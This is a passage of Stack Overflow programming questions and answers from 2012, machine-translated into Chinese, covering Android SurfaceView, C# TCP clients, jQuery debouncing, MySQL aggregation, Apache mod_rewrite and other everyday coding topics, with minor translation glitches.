> 时间：2012-08-01T01:47:42.243
> 
> 标签：android, surfaceview

在搜索了 google、各种 android 博客、各种游戏开发博客和其他关于 android 中表面视图的教程网站后，我希望对表面视图有一个完整的了解。我在 Safaribooks 上阅读了几本关于 android 和表面视图的书籍，但它们提供的信息要么太少，要么使用其他 SDK，例如 AndEngine。我希望严格地学习表面观点。我玩过 Lunar Lander 示例项目以及我发现的其他项目，并创建了一些骨架表面视图的代码。它由仅用于骨架的 3 个类组成。

MainActivity 类：

```
package com.learning.svlearning;

import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;
import android.view.Window;
import android.view.WindowManager;

public class MainActivity extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

    //Set FullScreen Mode - No title bars!!
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        // Screen created with pure java - Say no to xml (atleast for this demo)
        setContentView(new MainGamePanel(this));
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.layout_game_window, menu);
        return true;
    }
} 
```

这门课很简单。主游戏活动窗口，请求全屏，没有标题栏。真正的游戏应该是怎样的:) 这个类通过传递“this”（MainActivity）类的上下文来调用我们的下一个视图类。

MainGamePanel 类：

```
package com.learning.svlearning;

import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Color;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

public class MainGamePanel extends SurfaceView {
final static public String tag = "Tracer";

private GameThread gameThread;  // For our thread needed to do logical processing without holding up the UI thread
private SurfaceHolder holder; // For our CallBacks.. (One of the areas I don't understand!)

public MainGamePanel(Context context) {
    super(context);
    Log.d(tag, "Inside MainGamePanel");
    gameThread = new GameThread(this); //Create the GameThread instance for our logical processing
    holder = getHolder();

    holder.addCallback(new SurfaceHolder.Callback() {

// Since we are using the SurfaceView, we need to use, at very least, the surfaceDestroyed and surfaceCreated methods.
        @Override
        public void surfaceDestroyed(SurfaceHolder holder) {
            boolean retry = true;
            Log.d(tag, "Inside SurfaceHolder Callback - surfaceDestroyed");
            gameThread.setRunning(false); // Stop the Thread from running because the surface was destroyed.  Can't play a game with no surface!!  

            while (retry) { 
                try {
                    Log.d(tag, "Inside SurfaceHolder Callback - surfaceDestroyed - while statement");
                    gameThread.join();
                    retry = false; //Loop until game thread is done, making sure the thread is taken care of.
                } catch (InterruptedException e) {
                    //  In case of catastrophic failure catch error!!!
                }
            }

        }

        @Override
        public void surfaceCreated(SurfaceHolder holder) {
            // let there be Surface!
            Log.d(tag, "Inside SurfaceHolder Callback - surfaceCreated");
            gameThread.setRunning(true); // Now we start the thread
            gameThread.start(); // and begin our game's logical processing

        }

        @Override
        public void surfaceChanged(SurfaceHolder holder, int format,
                int width, int height) {
            // The code to resize the screen ratio when it flips from landscape to portrait and vice versa

        }
    });
}

@Override
protected void onDraw(Canvas canvas) {
//This is where we draw stuff..  since this is just a skeleton demo, we only draw the color Dark Grey so we can visibly see that we actually accomplished something with the surfaceview drawing
    Log.d(tag, "Inside onDraw"); 
    canvas.drawColor(Color.DKGRAY); // You can change the Color to whatever color you want, for this demo I just used Color.DKGRAY 

    }

} 
```

这个类主要处理使用 onDraw 方法绘制我们的资源/图像，处理我们的表面被创建和销毁时发生的事情（也当屏幕发生变化时，但我暂时没有编写任何代码来处理它），并调用我们的GameThread 类处理我们的游戏逻辑的处理。

游戏线程类：

```
package com.learning.svlearning;

import android.graphics.Canvas;
import android.util.Log;

public class GameThread extends Thread{
final static public String tag = "Tracer";

private MainGamePanel view; 
private boolean running = false;

static final long FPS = 30; // To help limit the FPS when we draw, otherwise we would kill the CPU and increase the Battery Consumption.

public GameThread(MainGamePanel view){
    Log.d(tag, "inside GameThread");
    this.view = view;
}

public void setRunning(boolean run){
    Log.d(tag, "inside GameThread - setRunning");
    running = run; // For starting / stoping our game thread
}

@Override
public void run() {
    long ticksPS = 1000 / FPS; // Limit the frames per second
    long startTime; 
    long sleepTime;
    Log.d(tag, "inside GameThread - run");

    while(running){ // Our Main Game Loop is right here
        Canvas c = null; // build our canvas to draw on
        Log.d(tag, "inside GameThread - run - while loop");
        startTime = System.currentTimeMillis(); //get the current time in milliseconds - this is for helping us limit the FPS
        try{
            c = view.getHolder().lockCanvas(); //Before we can draw, we always have to lock the canvas, otherwise goblins will invade your app and destroy everything!
            synchronized (view.getHolder()){ // we have to synchronize this because we need to make sure that the method runs when at the proper time.
                view.onDraw(c); // this is where we pass our drawing information.  The canvas gets passed to the onDraw method in our MainGamePanel class.
            }
        }finally{
            if(c != null) {
                view.getHolder().unlockCanvasAndPost(c); // Once we are done drawing, we unlock our canvas and post.  which means we drew on the canvas, and now the devices screen will display our drawing.
            }
        }
        sleepTime = ticksPS-(System.currentTimeMillis() - startTime); // this is where we calculace how long we need this thread to sleep (again with the FPS) we want it limited to 30 FPS as defined in our FPS variable.
        try {
            if (sleepTime > 0){
                   sleep(sleepTime); // night night, sleep to limit the fps and save our batteries!
            }
            else{
                   sleep(10); // Incase something goes crazy, we still want to sleep the thread to save the battery.
            }
        }catch(Exception e){

        }

    }

}

} 
```

此类处理游戏逻辑并将任何可绘制信息发送到 MainGamePanel 类中的绘制方法。例如，如果我们有一个角色移动，我们可以将 x 和 y 坐标发送到我们的 draw 方法，以将我们的角色绘制到不同的位置。

现在这些课程的某些部分我并不完全理解。就像回调一样，当阅读 googles android 开发者页面上的信息时，我对它是什么以及我们为什么使用它感到更加困惑。另外，如果有人对此有任何补充，或者看到我可能误解的任何内容，请随时纠正我。我喜欢使用 android，虽然这很困难，但当你开始弄清楚事情时，它是非常有益的！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T06:34:43.723

SurfaceHolder 回调的目的是处理这 3 个事件。surfaceCreated()、surfaceDestroyed() 和 surfaceChanged()。

如果您阅读代码，您会看到 surfaceCreated() 处理在创建表面时需要发生的事情等等......

这是您问题的答案还是还有更多？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-05T09:29:18.127

使用 SurfaceView 时，您应该将绘图方法更改为除 onDraw() 以外的名称。这样主线程永远不会意外地 invalidate() 它！

# c# - 事件驱动的 TCP 客户端

> ID：11751542
> 
> 赞同：7
> 
> 时间：2012-08-01T01:48:17.890
> 
> 标签：c#, events, tcp, client

我想要一个事件驱动的、windows、c#、tcp 客户端。

当读取缓冲区中至少有 35 个字节时，我希望调用一个处理程序来读取这 35 个字节，从该“数据包”中获取一个长度值，然后对第二个数据长度进行阻塞读取。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-03T13:59:54.430

有一个相对较新的项目基本上提供了这个：[https ://github.com/clariuslabs/reactivesockets](https://github.com/clariuslabs/reactivesockets)

从他们的页面：

> 实现了一个非常易于使用的基于 IObservable 的套接字 API。它允许非常简单的协议实现，例如：

```
var client = new ReactiveClient("127.0.0.1", 1055);

// The parsing of messages is done in a simple Rx query over the receiver observable
// Note this protocol has a fixed header part containing the payload message length
// And the message payload itself. Bytes are consumed from the client.Receiver 
// automatically so its behavior is intuitive.
IObservable<string> messages = from header in client.Receiver.Buffer(4)
                               let length = BitConverter.ToInt32(header.ToArray(), 0)
                               let body = client.Receiver.Take(length)
                               select Encoding.UTF8.GetString(body.ToEnumerable().ToArray());

// Finally, we subscribe on a background thread to process messages when they are available
messages.SubscribeOn(TaskPoolScheduler.Default).Subscribe(message => Console.WriteLine(message));
client.ConnectAsync().Wait(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T02:15:44.420

要朝着正确的方向前进，请查看[`Socket.BeginReceive()`](http://msdn.microsoft.com/en-us/library/dxkwh6zw.aspx)和[`Socket.BeginSend()`](http://msdn.microsoft.com/en-us/library/ms145136.aspx)。

此外，[这里](http://msdn.microsoft.com/en-us/library/bbx2eya8.aspx)有一系列来自 Microsoft 的方便示例，用于说明如何使用上述功能。这帮助我开始使用这些。

不幸的是，除非读取缓冲区中至少有 35 个字节，否则我看不到调用回调的选项；每当收到任何内容时都会调用它——即使它是零字节。但是，交易对手很可能不会逐字节地向您发送消息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T02:26:05.937

我不相信 BCL 中有任何基于事件的套接字类，但如果你只是在寻找比裸更高级别的东西`Socket`，也许你应该研究[`TcpClient`](http://msdn.microsoft.com/en-us/library/system.net.sockets.tcpclient.aspx). 它将为您处理缓冲底层流，让您通过 a`StreamReader`等访问它：

```
TcpClient client;
// ... construct, connect, etc ...
new StreamReader(client.GetStream()); 
```

如果您使用的是基于线路的协议，您只需要使用[`StreamReader.ReadLine()`](http://msdn.microsoft.com/en-us/library/system.io.streamreader.readline)，但[`StreamReader.Read()`](http://msdn.microsoft.com/en-us/library/9kstw824)也应该很容易满足您的目的。

# java - Java instanceof 运算符

> ID：11751550
> 
> 赞同：2
> 
> 时间：2012-08-01T01:49:42.570
> 
> 标签：java, instanceof, comparison-operators

是否存在可与`instanceof`运算符一起使用的有效类类型变量？例如：

```
String s = "abc";

Class<?> classType = String.class;

if (s instanceof classType) {
    //do something
} 
```

作为替代方案：

```
if (s.getClass() == classType) {
    //do something
} 
```

会有任何性能优势吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-01T01:54:52.833

你所做的实际上并不相同。考虑子类会发生什么（我知道你不能 subclass `String`，所以在这种`String`情况下没关系）。

```
class A {}
class B extends A {}

B b = new B();
b instanceof A // true
b.getClass() == A.class // false 
```

如果你有一个对象，你想知道它是否是某种类型的实例并且你有这个`Class`对象，你可以使用该`Class#isInstance`方法。

在任何一种情况下，我都希望性能差异微不足道。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-01T01:52:57.417

还有

```
Class<?> classType = String.class;

if (classType.isInstance(s)) {... 
```

至于性能，我希望这些之间的差异可以忽略不计。

# jquery - jQuery 中断事件（等待一段时间）

> ID：11751551
> 
> 赞同：0
> 
> 时间：2012-08-01T01:49:56.020
> 
> 标签：jquery, ajax

我正在使用此代码通过 ajax 和 jquery 进行搜索：

```
// this is the id of the submit button
$("form#search_form input#key").keyup(function() {
    if ( $(this).val().length >=2 ){

    var url = base_url()+"welcome/search2"; // the script where you handle the form input.

    $.ajax({
           type: "POST",
           url: url,
           data: { 'key':$("#key").val() }, // serializes the form's elements.
           success: function(data)
           {
               //alert(data); // show response from the php script.
               $('#livesearch').html(data); 
           }
         });

    return false; // avoid to execute the actual submit of the form.
    }
    else $("#fonded2").hide();
}); 
```

但是当用户快速写入时会出现问题。当用户在 500 毫秒后输入新字母时，有什么方法可以中断搜索

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T02:14:06.260

```
var timer;

$("form#search_form input#key").keyup(function(e) {
    if (e.which==13) return false; // avoid executing form.
    clearTimeout(timer);
    if ( this.value.length >=2 ){
        var url = base_url()+"welcome/search2";

        timer=setTimeout(function() {
            $.ajax({
                type: "POST",
                url: url,
                data: { 'key':$("#key").val() },
                success: function(data) {
                    //alert(data);
                   $('#livesearch').html(data); 
               }
           });
        }, 500);
    }else{
       $("#fonded2").hide();
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:10:31.983

也许您应该等到输入模糊。我想这是考虑到[谷歌等待](https://accounts.google.com/SignUp?continue=http%3A%2F%2Fwww.google.com%2F&hl=en)在他们的用户名字段的注册页面上调用模糊事件的最佳方式。

# c++ - 什么是 int(a)(1)？这是一个有效的 c++ 语法吗？

> ID：11751561
> 
> 赞同：19
> 
> 时间：2012-08-01T01:51:45.940
> 
> 标签：c++

```
#include <iostream>
int main()
{
    // ------- some statements ---------

    int(a)(1);

    // -------- some other statements .......
    return 0;
} 
```

我在一个 C++ 程序中看到了这个语句。这不会导致语法错误。

这是什么`a`？这是有效的 C++ 语法吗？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-08-01T01:53:47.167

可以将变量的名称放在括号中：

```
int i;
int (i); // exact same 
```

所以在你的情况下：

```
int a(1); // initialized with 1
int (a)(1); // exact same 
```

# javascript - Javascript对象操作问题

> ID：11751562
> 
> 赞同：0
> 
> 时间：2012-08-01T01:51:50.807
> 
> 标签：javascript

假设我有一个 JavaScript 对象，它由几个字符串键和 JavaScript 对象的键/值对组成。

```
var obList = { key:{..}, key2:{..}, key3:{..}, ... } 
```

我构建了一个新集合 obList2

```
var obList2 = { key:{..}, key2:{..}, key3:{..}, ... } 
```

我想写一个基于obList2修改obList的函数。我遇到问题的第一步是删除 obList 中所有具有 obList2 中不存在的键的对象。对此的任何想法/实施都会有所帮助。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:56:23.423

您可以使用循环遍历对象[`for .. in`](https://developer.mozilla.org/en/JavaScript/Reference/Statements/for...in)并使用 . 检查属性是否存在[`Object.hasOwnProperty()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/HasOwnProperty)。

例子：

```
for (var prop in obList) {
    if (obList.hasOwnProperty(prop) && !obList2.hasOwnProperty(prop)) {
        delete obList[prop];
    }
} 
```

第一个条件是防止修改，`Object.prototype`第二个条件是检查第二个对象上是否不存在该属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:56:50.907

代码的基本元素：检查对象是否缺少特定键的能力。以下是你的做法：

```
if (window.bla === undefined) { 
  console.log("Key bla is missing!")
} 
```

# grails - 在grails中动态生成html

> ID：11751563
> 
> 赞同：0
> 
> 时间：2012-08-01T01:51:55.733
> 
> 标签：grails

我的`viewer.gsp`页面中有以下 HTML：

```
<div id="bookmarks" style="height:150px;width:250px; padding-left: 100px;margin-top: -54px;font:16px/26px Georgia, Garamond, Serif;overflow:scroll;">
    <p><a onclick="seek('00:03:00');">00:03:00</a></p>
    <p><a onclick="seek('00:10:45');">00:10:45</a></p>
    <p><a onclick="seek('00:25:30');">00:25:30</a></p>
    <p><a onclick="seek('00:45:31');">00:45:31</a></p>
    <p><a onclick="seek('01:01:01');">01:01:01</a></p>
    <p><a onclick="seek('01:11:11');">01:11:11</a></p>
    <p>${params['bookmarks']}</p>
</div> 
```

`params['bookmarks']`包含一系列时间字符串，例如`00:04:00`. 我希望能够如上所示将它们打印出来，所以它会像这样：

```
foreach(bookmark in bookmarks){
   print "<p><a onclick='seek($bookmark);'>$bookmark</a></p>";
} 
```

我想`grails`可能有一些内置功能可以让我做到这一点。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T02:01:07.020

因此，您可能正在寻找 g:each 标签： http: [//grails.org/doc/latest/ref/Tags/each.html](http://grails.org/doc/latest/ref/Tags/each.html)

```
<g:each in="${bookmarks}" var="bookmark">
    <p><a onclick='seek(${bookmark});'>${bookmark}</a></p>
</g:each> 
```

# mysql - 如何使用 MySql 代码执行 crontab？

> ID：11751566
> 
> 赞同：1
> 
> 时间：2012-08-01T01:52:25.327
> 
> 标签：mysql, crontab

我有一个文件：`test.txt`. 该文件每天自动更新。文件中的文本示例：

```
TRUNCATE TABLE names;
INSERT INTO names (id, name) VALUES (1, 'john');
TRUNCATE TABLE apples;
INSERT INTO apples (id, name) VALUES (1, 'green'); 
```

我只需要设置一个每天 02:00 执行这个 MySQL 代码的 crontab。

我知道如何设置启动 PHP 文件的 crontab 命令，但我找不到关于如何启动存储在另一个文件中的 MySQL 代码的答案，其中包含多个查询。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:54:02.617

尝试文档页面[4.5.1.5。从文本文件执行 SQL 语句](https://dev.mysql.com/doc/refman/5.7/en/mysql-batch-commands.html)

命令.sql：

```
TRUNCATE TABLE names; 
INSERT INTO names (id, name) VALUES (1, 'john'); 

TRUNCATE TABLE apples; 
INSERT INTO apples (id, name) VALUES (1, 'green'); 
```

命令：

```
mysql -uusername -ppassword db_name < commands.sql 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:54:01.020

从文本文件执行 SQL 语句

[https://dev.mysql.com/doc/refman/5.7/en/mysql-batch-commands.html](https://dev.mysql.com/doc/refman/5.7/en/mysql-batch-commands.html)

# mysql - 不能做 SUM 的 SUM 吗？

> ID：11751567
> 
> 赞同：0
> 
> 时间：2012-08-01T01:52:27.323
> 
> 标签：mysql, sql

以下查询似乎在计算“ratingValue”时存在问题，因为 SUM 中有 SUM(h.liked)。

```
SELECT d.itemID1 as item, 
    sum(d.sum + d.count*SUM(h.liked))/sum(d.count) as ratingValue
FROM history h, dev d 
WHERE h.userID=:id_user
    AND d.itemID1<>h.itemID 
    AND d.itemID2=h.itemID 
GROUP BY d.itemID1,h.itemID 
```

为了更好地理解，这是原始和有效的查询（来自 Slop One 算法）：

我只是用“history”替换“rating”表，因为在我的例子中，r.ratingValue 是用户给 itemID 的所有“like”的总和（=> r.ratingValue = SELECT SUM(liked) FROM history GROUP通过 h.itemID ）：

```
SELECT d.itemID1 as item, 
    sum(d.sum + d.count*r.ratingValue)/sum(d.count) as ratingValue 
FROM rating r, dev d 
WHERE r.userID=$userID 
    AND d.itemID1<>r.itemID 
    AND d.itemID2=r.itemID 
GROUP BY d.itemID1 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T03:07:43.593

正如错误消息所说，您不能使用下一个聚合函数。我想你的意思是：

```
SELECT d.itemID1 as item, 
       sum(d.sum + d.count*h.sumliked)/sum(d.count) as ratingValue
FROM (select h.userId, h.itemId, sum(h.liked) as sumliked
      from history h
      group by h.userId, h.itemId
     ) h join
     dev d 
     on h.userID=:id_user AND
        d.itemID1<>h.itemID AND
       d.itemID2=h.itemID 
GROUP BY d.itemID1 
```

也就是说，您需要单独进行聚合，在这种情况下使用子查询。我还修复了查询中的连接语法。

# apache - mod_rewrite 不允许访问现有目录

> ID：11751570
> 
> 赞同：0
> 
> 时间：2012-08-01T01:53:15.553
> 
> 标签：apache, .htaccess, mod-rewrite, seo

您好，感谢您抽出宝贵时间查看此内容。

我在我的 .htaccess 中设置了规则来创建对 seo 友好的 url。我使用 mysql 和 php 来填充每个页面上的内容，这些内容都在 index.php 上。该规则设置为涵盖两个级别的链接，例如。

mysite.com/first-level-link mysite.com/first-level-link/second-level-link

该脚本目前在网站前端（所有重定向到 index.php 的网页）上运行良好。但我无法访问位于服务器上真实目录中的站点后端，路径如下所示 - mysite.com/admin/index.php

我已经包含了两个规则/条件，如果它们存在，它们应该忽略目录和文件。我将包括以下代码：

```
Options +SymLinksIfOwnerMatch

RewriteEngine on
RewriteCond %{HTTP_HOST} !^www\.
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]

RewriteRule \.(css|jpe?g|gif|png|js)$ - [L]

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f

RewriteRule ^(.*)$ index.php?page=$1 
RewriteRule ^.*/(.*)$ index.php?page=$1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T03:16:42.090

`!-f`and`!-d`条件仅适用于 next `RewriteRule`，因此您的第二条规则没有任何与之相关的条件。您还需要复制该规则的条件。另一个问题是第二条规则被第一条规则所取代。由于在它有机会`/some/path`匹配`^(.*)$`之前匹配`^.*/(.*)$`，所以你需要交换它们。

因此，您的所有规则（从 开始`RewriteEngine on`）将如下所示：

```
RewriteCond %{HTTP_HOST} !^www\.
RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]

RewriteRule \.(css|jpe?g|gif|png|js)$ - [L]

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^.*/(.*)$ index.php?page=$1 

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ index.php?page=$1 
```

# javascript - 是否可以从 JavaScript 生成 html？

> ID：11751571
> 
> 赞同：0
> 
> 时间：2012-08-01T01:53:18.750
> 
> 标签：javascript, html

是否可以从 JavaScript 生成 html？例如，我有这个：

```
 <script type="text/javascript">
    for (i=0; i<=length; i++)
      {
        //I want to display a <p> tag containing the value of i
      }  
    </script> 
```

因此，如果长度 = 5，生成的 html 应该如下所示：

```
 <p>0</p>
    <p>1</p>
    <p>2</p>
    <p>3</p>
    <p>4</p>
    <p>5</p> 
```

是否有可能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T01:56:52.333

很有可能。您可以将元素插入 DOM：

```
var NewP;
var Text;

for(var i = 0; i < 5; i++)
{
    NewP = document.createElement("p"); // Create a p element
    Text = document.createTextNode(i + ""); // Create text to go inside with string value of i
    NewP.appendChild(Text); // Add text to p element
    document.body.appendChild(NewP); // Append newly-created p element to body element in DOM tree
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:56:30.983

```
<SCRIPT LANGUAGE="JavaScript">
<!--
greeting = "<H1>Hi Web surfers!</H1>"
welcome = "<P>Welcome to <CITE>stackoverflow.com</CITE>.</P>"
// -->
</SCRIPT>
</HEAD>
<BODY>
<SCRIPT LANGUAGE="JavaScript">
<!--
document.write(greeting)
document.write(welcome)
// -->
</SCRIPT> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T01:57:19.527

当然。您的代码如下所示：

```
<script type="text/javascript">
var total = 5;
for (i=0; i <= total; i++)
  {
    document.write('<p>' + i + '</p>');
  }  
</script> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T01:57:17.240

是的。这是可能的。例如：

```
<script type="text/javascript">
  var html = "";
  for (i=0; i<=6; i++) {
      html += "<p>" + i + "</p>";
  } 
  document.write(html);
</script> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-01T01:58:01.970

你可以把 `document.write('<p>' + i + '</p>');`你的循环

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-01T02:00:16.180

是的，有可能：

[http://www.java2s.com/Code/JavaScript/HTML/GeneratingHTMLOntheFly.htm](http://www.java2s.com/Code/JavaScript/HTML/GeneratingHTMLOntheFly.htm)

但是有一些很好的插件可以更好地促进这个过程，特别是如果你打算做更多这样的事情：

[http://api.jquery.com/category/plugins/templates/](http://api.jquery.com/category/plugins/templates/)

[http://akdubya.github.com/dustjs/](http://akdubya.github.com/dustjs/)

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2012-08-01T01:56:50.160

您可以`<div id="div"></div>`在您的 html 中制作 a 并简单地在函数中制作：

```
$("#div").html('<p>'+i+'</p>'); 
```

# c# - 如何克服“无法登录用户请求的数据库”？

> ID：11751576
> 
> 赞同：0
> 
> 时间：2012-08-01T01:53:57.060
> 
> 标签：c#, sql-server-2008

您好，我刚刚发布了一个需要使用 Sql Server 2008 和 Visual C# 2010 的数据库的应用程序。它在我的笔记本电脑上运行良好，但是当我在另一台笔记本电脑上尝试时，我收到了这个错误！

[http://i.stack.imgur.com/eZGJ8.png](http://i.stack.imgur.com/eZGJ8.png)

我使用 SQL 身份验证方法授予用户对数据库的读写权限，但它没有用，这是我的连接字符串

```
stringkoneksi = @"Server = .\SQLEXPRESS;" +
                        "Database = UGsimplify;" + 
                        "Integrated Security = false;" +
                        "User ID = 'userdefined';" +
                        "Password = 'blablabla'"; 
```

你有没有一步一步让它在另一台笔记本电脑上工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:05:12.080

您需要做的第一件事是更改连接字符串，使其使用服务器名称而不是 . （本地主机）。例如，将连接字符串更改为：

stringkoneksi = @"服务器 = [服务器名称]\SQLEXPRESS;" + "数据库 = UGsimplify;" +“综合安全=假；” + "用户 ID = '用户定义';" + "密码 = 'blablabla'";

（将 [SERVERNAME] 替换为托管数据库的计算机的名称。）

您还需要确保充当数据库服务器的计算机具有适当的安全设置以允许远程数据库连接（防火墙设置等）。

！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T03:09:32.797

试试这个：

```
stringkoneksi =   @"Data Source=myServerAddress\SQLEXPRESS;Initial Catalog=UGsimplify;User Id=myUsername;Password=myPassword"; 
```

将您的 SQL server 安全配置为 sql server 和 windows 身份验证模式。

设置 SQL Server 和 Widows 身份验证模式。

1.  连接到您的 SQL Server 实例
2.  右键单击转到属性
3.  在选择页面容器上选择安全性
4.  然后在服务器身份验证上选择 SQL Server 和寡妇身份验证模式。
5.  点击确定

确保您的笔记本电脑（服务器）SQL Server 实例正在运行。

问候

# image - 让图像显示在自定义 ButtonImage 控件中 c#

> ID：11751582
> 
> 赞同：0
> 
> 时间：2012-08-01T01:54:40.147
> 
> 标签：image, button

我是 c# 新手，我正在尝试创建一个 ButtonImage 控件。我已经设法让大部分代码工作，包括 TextAlignment 和图像资源选择，但图像不会显示。我尝试添加 TextImageRelation 属性以及 ImageAlignment 属性无效 - 甚至不确定我是否已正确完成所有操作。我花了几个小时搜索 MSDN 和互联网，请帮助，tnx。继承人的代码：

```
namespace ImageButton
{
    //[System.ComponentModel.DefaultBindingProperty("ButtonText")]
    public partial class ImageButton : UserControl
    {
        private String name = "btn1";
        private String btnText = "Button1";
        private TextImageRelation textImage = TextImageRelation.Overlay;
        private ContentAlignment alignmentValue = ContentAlignment.MiddleRight;
        private ContentAlignment imageAlignmentValue = ContentAlignment.MiddleLeft;

        public ImageButton()
        {
            InitializeComponent();
        }
        //
        // Properties
        //
        [Description("Sets the Text Label"),
         Category("Custom")]
        public String ButtonText
        {
            get
            {
                return btnText;
            }
            set
            {
                btnText = value;
                btn1.Text = btnText;
            }
        }
        [Description("Sets the Button Image"),
         Category("Custom")]
        public Image Image
        {
            get;
            set;
        }
        [Description("Specifies the relationship of text to Image."),
         Category("Custom")]
        public TextImageRelation TextImageRelation { 
            get{
                return textImage;
            }
            set{
                textImage =value;
                btn1.TextImageRelation = textImage;
            }
        }
        [Category("Custom"),
         Description("Specifies the alignment of text.")]
        public ContentAlignment TextAlignment
        {
            get
            {
                return alignmentValue;
            }
            set
            {
                alignmentValue = value;
                btn1.TextAlign = alignmentValue;
                //Invalidate();
            }
        }
        [Category("Custom"),
         Description("Specifies the alignment of text.")]
        public ContentAlignment ImageAlignment
        {
            get
            {
                return imageAlignmentValue;
            }
            set
            {
                imageAlignmentValue = value;
                btn1.ImageAlign = imageAlignmentValue;
            }
        }    
        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            StringFormat style = new StringFormat();
            style.Alignment = StringAlignment.Far;
            switch (alignmentValue)
            {
                case ContentAlignment.MiddleLeft:
                    style.Alignment = StringAlignment.Near;
                    break;
                case ContentAlignment.MiddleRight:
                    style.Alignment = StringAlignment.Far;
                    break;
                case ContentAlignment.MiddleCenter:
                    style.Alignment = StringAlignment.Center;
                    break;
            }
            // Call the DrawString method of the System.Drawing class to write   
            // text. Text and ClientRectangle are properties inherited from
            // Control.
            e.Graphics.DrawString(
                Text,
                Font,
                new SolidBrush(ForeColor),
                ClientRectangle, style);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T05:01:28.123

解决了：

代替：

```
 public Image Image{ get; set;} 
```

正如其他人所建议的那样，我使用了

```
 public Image Image{
        get { return image; }
        set
        {
            image = value;
            btn1.Image = image;
        }
    } 
```

# c# - 实体框架中的复杂动态查询

> ID：11751591
> 
> 赞同：2
> 
> 时间：2012-08-01T01:55:52.500
> 
> 标签：c#, entity-framework

我需要创建一个接收字符串列表的函数，并返回所有匹配项的列表（即 SQL“LIKE”，不区分大小写并忽略变音符号）：

```
// Pseudocode example
IEnumerable<Item> Search(List<String> patterns)
{
    var result = new List<Item>();

    foreach (var Item in context.Items)
    {
        bool matches = true;

        foreach (var pattern in patterns)
        {
            if (!Item.Name.Contains(pattern))
            {
                matches = false;
                break;
            }
        }

        if (matches)
        {
            result.Add(Item);
        }
    }

    return result;
} 
```

虽然与此类似的东西有效，但它并不理想（它似乎非常低效）。

是否可以创建一个（可能是 LINQ）查询来生成类似于以下 SQL 的内容？：

```
SELECT *
FROM items
WHERE items.name LIKE :pattern1
  AND items.name LIKE :pattern2
  ...
  AND items.name LIKE :patternN 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T02:04:28.697

您可以简单地迭代您的模式并`WHERE`为每个模式应用一个子句。

```
var patterns = new List<string>();
using (var context = new MyDataContext())
{
    var query = (IQueryable<Area>)context.Areas;

    foreach (var pattern in patterns)
    {
        query = query.Where(a => a.Description.Contains(pattern));
    }

    return query.ToList();
} 
```

您可能知道，查询是延迟执行的，在这种情况下，直到`ToList`应用所有模式后的调用才会执行。

# android - 标签布局内的Android可滚动视图

> ID：11751595
> 
> 赞同：0
> 
> 时间：2012-08-01T01:56:08.110
> 
> 标签：android, android-layout, scrollview, expandablelistview

我目前在 android 布局的选项卡中遇到可滚动视图的问题。视图在选项卡下方滚动过去，但选项卡布局中没有实现可滚动视图，如下所示。

[http://i46.tinypic.com/2ccmp0w.png](http://i46.tinypic.com/2ccmp0w.png)

当我在选项卡式布局中放置一个可滚动视图时，它会显示一个小的可滚动视图，该视图看起来有问题且无法使用。如下图所示。

[http://tinypic.com/r/29ej2ft/6](http://tinypic.com/r/29ej2ft/6)

标签主机的代码如下

```
<?xml version="1.0" encoding="utf-8"?>
<TabHost
xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@android:id/tabhost"
android:layout_width="fill_parent"
android:layout_height="fill_parent">
<RelativeLayout
    android:layout_height="fill_parent"
    android:layout_width="fill_parent">
    <FrameLayout
        android:id="@android:id/tabcontent"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_alignParentTop="true"
        android:padding="5dp" />
    <TabWidget
